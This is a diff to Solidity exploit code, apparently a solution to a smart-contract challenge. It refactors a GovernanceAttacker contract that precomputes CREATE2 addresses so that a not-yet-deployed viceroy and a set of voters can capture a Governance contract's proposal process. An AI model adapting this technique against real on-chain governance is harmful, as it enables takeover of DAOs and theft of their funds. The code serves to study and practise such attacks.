@@ -134,14 +134,13 @@ contract GovernanceAttacker {
         address[] memory preCalcedVotersA = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 0, 5);
         address[] memory preCalcedVotersB = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 5, 10);
         address preCalcedViceroyA = getViceroyAddress(governance, proposal, preCalcedVotersA);
-        // address preCalcedViceroyB = getViceroyAddress(governance, proposal, preCalcedVotersB);
+        address preCalcedViceroyB = getViceroyAddress(governance, proposal, preCalcedVotersB);
 
         // elect viceroy
         governance.appointViceroy(preCalcedViceroyA, nonce);
 
         // deploy viceroy
-        AttackerViceroy viceroyA = new AttackerViceroy{salt: bytes32(nonce)}(governance, proposal, preCalcedVotersA);
-        assert(address(viceroyA) == preCalcedViceroyA);
+        AttackerViceroy viceroyA = deployViceroyAttack(governance, proposal, preCalcedVotersA);
 
         // deploy voter
         deployVoters(5);
@@ -154,11 +153,20 @@ contract GovernanceAttacker {
         assert(votes == preCalcedVotersA.length);
     }
 
+    function deployViceroyAttack(
+        Governance governance,
+        bytes memory proposal,
+        address[] memory voters
+    ) internal returns (AttackerViceroy) {
+        uint nonce = 1;
+        return new AttackerViceroy{salt: bytes32(nonce)}(governance, proposal, voters);
+    }
+
     function getViceroyAddress(
         Governance governance,
         bytes memory proposal,
         address[] memory voters
-    ) public view returns (address) {
+    ) internal view returns (address) {
         uint nonce = 1;
         bytes memory viceroyCreationCode = abi.encodePacked(
             type(AttackerViceroy).creationCode,
@@ -167,7 +175,7 @@ contract GovernanceAttacker {
         return getCreate2Address(viceroyCreationCode, nonce);
     }
 
-    function deployVoters(uint num) public {
+    function deployVoters(uint num) internal {
         for (uint i; i < num; i++) {
             new AttackerVoter{salt: bytes32(i)}();
         }
@@ -201,7 +209,6 @@ contract GovernanceAttacker {
     }
 }
 
-// TODO: propose in constructor
 contract AttackerViceroy {
     constructor(Governance governance, bytes memory proposal, address[] memory voters) {
         governance.createProposal(address(this), proposal);
